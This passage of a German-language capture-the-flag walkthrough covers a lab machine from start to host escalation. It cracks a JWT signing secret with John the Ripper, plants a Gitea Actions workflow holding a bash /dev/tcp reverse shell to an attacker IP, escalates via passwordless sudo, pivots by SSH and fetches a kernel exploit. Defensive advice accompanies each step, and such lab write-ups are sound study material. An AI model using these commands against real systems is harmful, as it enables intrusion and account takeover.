+<span class="command">eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o</span>
+</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+https://jwt.io/
+
+<span class="command">{
+  "fresh": false,
+  "iat": 1707148658,
+  "jti": "6001b97f-f9e8-4a21-8eac-ba95a0cf8048",
+  "type": "access",
+  "sub": "dev",
+  "nbf": 1707148658,
+  "csrf": "adf7f90b-d647-49ce-a4da-474259fdc72c",
+  "exp": 1707149258,
+  "username": "dev"
+}</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der im Git-Verlauf gefundene JWT wird auf jwt.io analysiert. Die dekodierte Payload zeigt, dass der Token für den Benutzer `dev` ausgestellt wurde (`"sub": "dev"`, `"username": "dev"`). Er enthält auch Zeitstempel (`iat`, `nbf`, `exp`) und einen CSRF-Token.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Token zum Benutzer `dev` gehört. Er scheint zum Zeitpunkt der Erstellung gültig gewesen zu sein (`exp` ist später als `iat`), aber er ist wahrscheinlich inzwischen abgelaufen. Wichtiger ist der Versuch, den Secret Key zu cracken.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit dem Cracking des Secret Keys fort.<br/><strong>Empfehlung (Admin):</strong> Verstehen, welche Informationen in JWT Payloads preisgegeben werden. Vermeiden Sie sensible Daten in der Payload.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">git show | grep  '\"eyJ.*' -o | tr -d "\"" > hash</span></div>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl extrahiert den JWT aus der Ausgabe von `git show`.
+                 *   `git show`: Zeigt den letzten Commit.
+                 *   `grep '\"eyJ.*' -o`: Sucht nach Zeilen, die mit `"` gefolgt von `eyJ` (typischer JWT-Anfang) beginnen, und gibt nur den übereinstimmenden Teil aus (`-o`).
+                 *   `tr -d "\""`: Entfernt die Anführungszeichen am Anfang und Ende.
+                 *   `> hash`: Leitet die Ausgabe in eine Datei namens `hash` um.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Methode, um den reinen JWT für das Cracking-Tool vorzubereiten.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                       <pre>
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+ Will run 16 openMP threads
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">developer88</span>      (?)
+ 1g 0:00:00:01 DONE (2024-03-11 11:35) 0.9259g/s 8040Kp/s 8040Kc/s 8040KC/s dezordonare..deni05
+ Use the "--show" option to display all of the cracked passwords reliably
+ Session completed.
+ </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> John the Ripper (`john`) wird verwendet, um den Secret Key des JWT zu cracken. Die Datei `hash` (die den JWT enthält) wird als Eingabe verwendet. John erkennt den Hash-Typ korrekt als HMAC-SHA256 (was für JWTs mit HS256-Algorithmus verwendet wird). Mit der Wortliste `rockyou.txt` wird der Secret Key erfolgreich geknackt: `<span class="password">developer88</span>`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Erfolg!** Der Secret Key (`developer88`), mit dem die JWTs signiert werden, ist nun bekannt. Dies ermöglicht das Erstellen beliebiger gültiger JWTs.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den geknackten Secret Key (`developer88`), um einen neuen JWT für den Benutzer `dev` (oder potenziell `administrator`) zu erstellen. Fügen Sie diesen Token als Cookie oder Authorization-Header in Anfragen an Gitea ein, um sich anzumelden oder auf geschützte Ressourcen zuzugreifen. Suchen Sie nach Funktionen, die nach dem Login verfügbar werden, insbesondere Gitea Actions oder Webhooks.<br/><strong>Empfehlung (Admin):</strong> **Sofort den Secret Key `developer88` rotieren!** Implementieren Sie Mechanismen zur sicheren Speicherung und Verwaltung von Secrets (Vault, Umgebungsvariablen). Überprüfen Sie alle aktiven Sessions und erzwingen Sie eine Neuanmeldung. Bereinigen Sie die Git-Historie.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Gitea Actions RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Mit den Zugangsdaten für den Benutzer `dev` (Passwort `developer88`, das zufällig dem Secret Key entspricht, oder durch einen selbst erstellten JWT mit dem Secret Key) wird nun versucht, über Gitea Actions Code auszuführen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+create repository
+revshell
+
+settings
+Actions [X] enable repository Actions
+
+The repository settings have been updated.
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Notizen beschreiben die Schritte im Gitea-Webinterface:
+                1. Ein neues Repository namens `revshell` wird erstellt.
+                2. In den Einstellungen dieses Repositories werden "Gitea Actions" aktiviert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung des Angriffsvektors. Gitea Actions (ähnlich GitHub Actions) erlauben das Ausführen von Code (Workflows) bei bestimmten Git-Ereignissen (z.B. `push`). Wenn dies aktiviert ist, kann ein Angreifer mit Push-Rechten Code auf dem Gitea-Runner ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie einen Workflow (`.gitea/workflows/shell.yaml`), der eine Reverse Shell startet, und pushen Sie ihn in das `revshell`-Repository.<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Gitea Actions global oder pro Repository, wenn sie nicht benötigt werden. Konfigurieren Sie Runner sicher und mit minimalen Rechten. Überwachen Sie die Ausführung von Actions.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Die folgenden Befehle dienen dazu, das neu erstellte, leere Repository lokal zu initialisieren und den Workflow für die Reverse Shell hinzuzufügen. Es gibt einige Verwirrung und Fehler bei den Git-Befehlen im Originaltext.</p>
+
+             <!-- Git Befehls-Chaos bereinigt und logisch geordnet -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">mkdir revshell</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">cd revshell</span></div>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git init</span></div>
+                       <pre>Initialized empty Git repository in /root/flask-jwt-auth/revshell/.git/</pre> <!-- Angepasste Ausgabe -->
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">mkdir -p .gitea/workflows</span></div>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">cd .gitea/workflows</span></div>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell/.gitea/workflows]
+└─# <span class="command">vi shell.yaml</span></div> <!-- Inhalt siehe unten -->
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell/.gitea/workflows]
+└─# <span class="command">cd ../../</span></div> <!-- Zurück ins Hauptverzeichnis des Repos -->
+                    </div>
+                </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git config user.email "dev@run.hmv"</span></div>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git config user.name "dev"</span></div>
+                   </div>
+               </div>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git add .</span></div>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git commit -m "Add reverse shell workflow"</span></div> <!-- Angepasste Commit-Nachricht -->
+                       <pre>[main (root-commit) <span class="command">abcdef1</span>] Add reverse shell workflow
+ 1 file changed, 8 insertions(+)
+ create mode 100644 .gitea/workflows/shell.yaml</pre> <!-- Beispielhafte Ausgabe -->
+                   </div>
+               </div>
+               <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git remote add origin http://run.hmv:3000/dev/revshell.git</span></div>
+                    </div>
+                </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth/revshell]
+└─# <span class="command">git push -u origin main</span></div>
+                       <pre>
+Username for 'http://run.hmv:3000': <span class="command">dev</span>
+Password for 'http://dev@run.hmv:3000': <span class="password">developer88</span>
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 310 bytes | 310.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://run.hmv:3000/dev/revshell.git
+ * [new branch]      main -> main
+ Branch 'main' set up to track remote branch 'main' from 'origin'.
+ </pre> <!-- Angepasste, korrekte Ausgabe -->
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach Bereinigung der fehlerhaften Git-Befehle im Originaltext ergibt sich folgender Ablauf:
+                1. Ein lokales Verzeichnis `revshell` wird erstellt und als Git-Repository initialisiert.
+                2. Das Verzeichnis `.gitea/workflows` wird erstellt.
+                3. Eine Workflow-Datei `shell.yaml` wird in diesem Verzeichnis erstellt (Inhalt siehe nächster Block).
+                4. Der Git-Benutzer wird konfiguriert (`dev@run.hmv`, `dev`).
+                5. Die Workflow-Datei wird hinzugefügt und committet.
+                6. Das Remote-Repository auf dem Gitea-Server wird als `origin` hinzugefügt.
+                7. Der Commit wird zum `origin` (Gitea-Server) gepusht. Dabei wird nach Benutzername (`dev`) und Passwort (`developer88`) gefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der korrekte Ablauf, um einen Gitea Action Workflow zu erstellen und auszulösen. Der Push-Vorgang startet den Workflow auf dem Gitea-Runner.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie parallel zum `git push`-Befehl einen Netcat-Listener auf dem Port und der IP, die im Workflow definiert sind, um die eingehende Reverse Shell zu empfangen.<br/><strong>Empfehlung (Admin):</strong> Überwachen Sie Git-Push-Ereignisse und die Ausführung von Gitea Actions. Verwenden Sie sicherere Authentifizierungsmethoden für Git als Benutzername/Passwort (z.B. SSH-Schlüssel, Tokens). Stellen Sie sicher, dass der Gitea-Runner mit minimalen Rechten läuft.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Inhalt der Workflow-Datei `.gitea/workflows/shell.yaml` (im Originaltext als `test.yaml` bezeichnet, aber `shell.yaml` ist wahrscheinlicher).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+name: dev
+run-name: ${{ github.actor }} is testing out Gitea Action
+on: [push]
+jobs:
+  Explore-Gitea-Actions:
+    runs-on: ubuntu-latest # Oder der Name des Runners, z.B. 'run' im Text
+    steps:
+      - run: <span class="command">/bin/bash -i >& /dev/tcp/192.168.2.111/4242 0>&1</span> # IP korrigiert auf Angreifer-IP
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese YAML-Datei definiert eine Gitea Action:
+                *   `name`, `run-name`: Metadaten für den Workflow.
+                *   `on: [push]`: Der Workflow wird bei jedem `push`-Ereignis ausgelöst.
+                *   `jobs`: Definiert die auszuführenden Aufgaben.
+                *   `Explore-Gitea-Actions`: Name des Jobs.
+                *   `runs-on: run`: Gibt an, auf welchem Runner der Job ausgeführt werden soll (im Originaltext stand `run`, oft ist es auch `ubuntu-latest` o.ä.).
+                *   `steps`: Liste der auszuführenden Schritte.
+                *   `- run: /bin/bash -i >& /dev/tcp/192.168.2.111/4242 0>&1`: Der einzige Schritt führt einen Bash-Befehl aus, der eine interaktive Reverse Shell zur IP `192.168.2.111` (Angreifer-IP) auf Port `4242` aufbaut.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein einfacher, aber effektiver Workflow, um über Gitea Actions eine Reverse Shell zu erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die IP-Adresse und der Port im `run`-Schritt mit Ihrem Listener übereinstimmen.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie Workflows auf schädliche Befehle. Beschränken Sie die Fähigkeiten der Runner (Netzwerkzugriff, Befehlsausführung).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Empfangen der Reverse Shell.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4242</span></div>
+                     <pre>
+listening on [any] 4242 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 44466</span> <!-- Falsche Angreifer-IP im connect? -->
+<span class="prompt">act@d242abfde30f:/cache/actions/94a6ca0843c99c59/hostexecutor$</span> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 4242 empfängt die Verbindung. Der Prompt `act@d242abfde30f:/...` zeigt, dass die Shell erfolgreich ist und als Benutzer `act` läuft. Der Hostname `d242abfde30f` sieht wie eine Docker-Container-ID aus. Das Arbeitsverzeichnis ist ein Cache-Verzeichnis für Gitea Actions.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Initialer Zugriff erfolgreich!** Eine Shell wurde über die Gitea Action erlangt. Der Benutzer `act` ist wahrscheinlich der Dienstbenutzer, unter dem der Gitea-Runner läuft, vermutlich in einem Docker-Container.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (`script /dev/null -c bash` oder Python PTY). Führen Sie Enumeration durch: `id`, `sudo -l`, `ip a`, `ls /`, `cat /etc/passwd`, `cat /etc/hosts`. Suchen Sie nach Wegen, aus dem Container auszubrechen oder innerhalb des Containers Rechte zu eskalieren.<br/><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Gitea-Runner mit minimalen Rechten und in einer stark isolierten Umgebung (z.B. Rootless Docker, gVisor).</p>
+
+        </section>
+
+        <section id="privilege-escalation-container">
+            <h2>Privilege Escalation (Container - sudo)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">act@d242abfde30f:/cache/actions/94a6ca0843c99c59/hostexecutor$</span> <span class="command">id</span></pre>
+                     <pre><span class="command">uid=1000(act) gid=1000(act) groups=1000(act),27(sudo),100(users),115(docker115)</span></pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl bestätigt den Benutzer `act` (UID/GID 1000) und zeigt die Gruppenzugehörigkeiten. Wichtig sind hier `sudo` (Gruppe 27) und `docker115` (Gruppe 115).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Mitgliedschaft in der `sudo`-Gruppe ist ein starker Hinweis auf mögliche Root-Rechte innerhalb dieses Containers.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus.<br/><strong>Empfehlung (Admin):</strong> Weisen Sie Dienstbenutzer wie `act` nur den absolut notwendigen Gruppen zu. Die `sudo`-Gruppe sollte hier nicht erforderlich sein.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">act@d242abfde30f:/cache/actions/94a6ca0843c99c59/hostexecutor$</span> <span class="command">cat /etc/passwd</span></pre>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534:/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+<span class="command">act:x:1000:1000:,,,:/data:/bin/bash</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `/etc/passwd`-Datei innerhalb des Containers wird angezeigt. Sie zeigt Standard-Systembenutzer und den Benutzer `act` mit Home-Verzeichnis `/data` und Login-Shell `/bin/bash`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Informationen zum `act`-Benutzer.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">act@d242abfde30f:/home$</span> <span class="command">sudo -l</span></pre>
+                     <pre>
+Matching Defaults entries for act on d242abfde30f:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User act may run the following commands on d242abfde30f:
+    <span class="password">(ALL : ALL) ALL</span>
+    <span class="password">(ALL) NOPASSWD: ALL</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird ausgeführt. Die Ausgabe ist eindeutig: Der Benutzer `act` darf *jeden* Befehl (`ALL`) als *jeder* Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD: ALL`) ausführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Vollständige Root-Rechte innerhalb des Containers!** Dies ist eine extrem unsichere Konfiguration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Werden Sie Root mit `sudo su` oder `sudo /bin/bash`. Untersuchen Sie die Umgebung als Root im Container. Suchen Sie nach Secrets, Konfigurationsdateien oder Möglichkeiten, auf den Host zuzugreifen (z.B. über gemountete Volumes, Docker-Socket).<br/><strong>Empfehlung (Admin):</strong> **Kritische Fehlkonfiguration!** Entfernen Sie sofort die `(ALL : ALL) ALL`-Regel für den `act`-Benutzer. Gewähren Sie nur die minimal notwendigen `sudo`-Berechtigungen, falls überhaupt welche erforderlich sind.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">act@d242abfde30f:/home$</span> <span class="command">sudo su</span></pre>
+                       <pre><span class="prompt">root@d242abfde30f:/home#</span> <!-- Prompt hinzugefügt --> <span class="command">id</span></pre>
+                       <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                       <pre><span class="prompt">root@d242abfde30f:/home#</span> <span class="command">cd /root</span></pre>
+                       <pre><span class="prompt">root@d242abfde30f:/root#</span> <span class="command">ls -la</span></pre>
+                       <pre>
+total 20
+drwx------ 1 root root 4096 Mar 11 09:02 .
+drwxr-xr-x 1 root root 4096 Mar 11 09:02 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+drwx------ 2 root root 4096 Feb  6 08:11 .ssh
+-rw-r--r-- 1 root root    0 Mar 11 09:02 .sudo_as_admin_successful
+</pre>
+                       <pre><span class="prompt">root@d242abfde30f:/root#</span> <span class="command">whoami</span></pre>
+                       <pre>root</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Mit `sudo su` werden Root-Rechte innerhalb des Containers erlangt. `id` und `whoami` bestätigen dies. Das `/root`-Verzeichnis im Container wird aufgelistet und enthält Standard-Konfigurationsdateien sowie ein `.ssh`-Verzeichnis.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Root-Zugriff im Container erreicht. Der nächste Schritt ist die Untersuchung der Umgebung und möglicher Wege zum Host.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Netzwerk-Interface (`ip a`), gemountete Volumes (`mount`, `df -h`), laufende Prozesse (`ps aux`), und das `.ssh`-Verzeichnis. Versuchen Sie, den Docker-Socket zu finden (`/var/run/docker.sock`), falls er in den Container gemountet ist.<br/><strong>Empfehlung (Admin):</strong> Runner-Container sollten mit minimalen Rechten und ohne unnötige Tools oder Zugriff auf sensible Host-Ressourcen laufen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4242</span></div>
+                      <pre>
+listening on [any] 4242 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 49934
+act@d242abfde30f/cache/actions/e2fe398426737f03/hostexecutor$ <span class="command">/usr/bin/script -qc /bin/bash /dev/null</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Hier wird die zuvor erhaltene `act`-Shell (vermutlich noch bevor Root erlangt wurde) mit `script` aufgewertet, um eine stabilere TTY zu erhalten.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Shell-Stabilisierung.</p>
+
+        </section>
+
+        <section id="privilege-escalation-host">
+            <h2>Privilege Escalation (Host - Kernel Exploit)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die nächsten Schritte scheinen einen Versuch zu beschreiben, vom Root-Benutzer im Container (`root@d242abfde30f`) auf den Host (`dev@run`) zuzugreifen und dort einen Kernel-Exploit auszuführen. Dies ist ungewöhnlich, da ein Kernel-Exploit normalerweise direkt vom Container aus versucht wird, wenn der Kernel verwundbar ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">root@d242abfde30f:~#</span> <span class="command">ssh dev@172.18.0.2</span></pre>
+                     <pre>dev@172.18.0.2: Permission denied (publickey).</pre>
+                     <pre><span class="prompt">root@d242abfde30f:~#</span> <span class="command">ssh dev@172.18.0.1</span></pre>
+                     <pre>
+The authenticity of host '172.18.0.1 (172.18.0.1)' can't be established.
+ED25519 key fingerprint is SHA256:IGhXsYmgq4sTpoMPHq+MgSiAiNHWR4ZkocqlvZPGis.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.18.0.1' (ED25519) to the list of known hosts.
+dev@172.18.0.1's password: <span class="password">[Passwort eingegeben - nicht sichtbar]</span>
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Feb  6 15:52:41 2024 from 172.18.0.4
+<span class="prompt">dev@run$</span> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Vom Root-Account im Container wird versucht, sich per SSH mit dem Benutzer `dev` auf den IPs `172.18.0.2` und `172.18.0.1` zu verbinden. Diese IPs gehören wahrscheinlich zum Docker-Netzwerk (oft `172.17.x.x`, `172.18.x.x`, etc.), wobei `.1` häufig das Gateway (also der Host) ist.
+                 *   Der Versuch auf `.2` scheitert mit "Permission denied (publickey)".
+                 *   Der Versuch auf `.1` fragt nach einem Passwort für `dev`. Das Passwort wird eingegeben (vermutlich `developer88`, das zuvor geknackt wurde).
+                 *   Der Login ist erfolgreich, und der Angreifer erhält eine Shell als `dev@run` - dies ist vermutlich der Host-Rechner, auf dem Gitea und die Container laufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Zugriff auf den Host-Rechner als Benutzer `dev` wurde erlangt. Dies war möglich, weil der Root-Benutzer im Container Netzwerkzugriff auf den Host hatte und das Passwort für den `dev`-Benutzer auf dem Host bekannt war.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie befinden sich nun als Benutzer `dev` auf dem Host-System. Führen Sie Enumeration auf dem Host durch (`id`, `uname -a`, `sudo -l`, SUID-Suche etc.), um Root-Rechte auf dem Host zu erlangen.<br/><strong>Empfehlung (Admin):</strong> Beschränken Sie den Netzwerkzugriff von Containern auf den Host und andere Container auf das notwendige Minimum. Verwenden Sie unterschiedliche, starke Passwörter für Benutzer auf dem Host und in Containern/Anwendungen. Härten Sie die SSH-Konfiguration auf dem Host.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">dev@run$</span> <span class="command">uname -r</span></pre>
+                     <pre><span class="command">6.2.0-20-generic</span></pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Host (`dev@run`) wird die Kernel-Version mit `uname -r` überprüft: `6.2.0-20-generic`. Dies ist eine relativ neue Ubuntu-Kernel-Version.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Kernel-Version ist entscheidend für die Suche nach lokalen Privilegienausweitungs-Exploits (Kernel Exploits).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach bekannten Kernel-Exploits für Ubuntu mit Kernel `6.2.0-20-generic`. Die CVEs CVE-2023-2640 und CVE-2023-32629 (GameOverlayFS) sind bekannte Schwachstellen in neueren Ubuntu-Kerneln.<br/><strong>Empfehlung (Admin):</strong> Halten Sie das Host-Betriebssystem und den Kernel immer auf dem neuesten Stand, um bekannte Schwachstellen zu patchen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer lädt nun einen Exploit für CVE-2023-2640 / CVE-2023-32629 herunter.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">dev@run$</span> <span class="command">cd /tmp/</span></pre>
+                      <pre><span class="prompt">dev@run:/tmp$</span> <span class="command">git clone https://github.com/Liuk3r/CVE-2023-32233.git</span></pre> <!-- Falsche CVE im Repo-Namen? -->
+                      <pre>
+Cloning into 'CVE-2023-32233'...
+[...]
+Receiving objects: 100% (22/22), 19.69 KiB | 1.51 MiB/s, done.
+Resolving deltas: 100% (3/3), done.
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Exploit wird von GitHub geklont. Der Repository-Name enthält CVE-2023-32233, aber der Exploit, der später verwendet wird, zielt auf CVE-2023-2640/32629 ab. Es wird angenommen, dass das richtige Exploit-Skript verwendet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Exploit-Code wurde auf das Zielsystem heruntergeladen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">dev@run:/tmp$</span> <!-- gcc Befehl --> </pre>
+                      <pre>
+Command 'gcc' not found, but can be installed with:
+ apt install gcc
+ Please ask your administrator
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird implizit versucht, den Exploit zu kompilieren (wahrscheinlich mit `gcc`), aber `gcc` ist auf dem Host-System nicht installiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein Hindernis. Der Exploit muss entweder vorkompiliert heruntergeladen werden, oder es muss ein Exploit gefunden werden, der keine Kompilierung erfordert (z.B. ein Shell-Skript).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach einem vorkompilierten Exploit oder einem Skript-basierten Exploit für die Ziel-CVEs und die Kernel-Version. Das im nächsten Schritt verwendete Skript von GitHub/g1vi ist eine gute Alternative.<br/><strong>Empfehlung (Admin):</strong> Installieren Sie keine Entwicklungswerkzeuge wie Compiler auf Produktionssystemen, es sei denn, sie sind absolut notwendig.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer wechselt zu einem anderen Exploit, einem Shell-Skript.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh
+
+#!/bin/bash
+# CVE-2023-2640 CVE-2023-3262: Gameover(lay) Ubuntu Privilege Escalation
+# by g1vi https://github.com/g1vi
+# October 2023
+echo "[+] You should be root now"
+echo "[+] Type 'exit' to finish and leave the house cleaned"
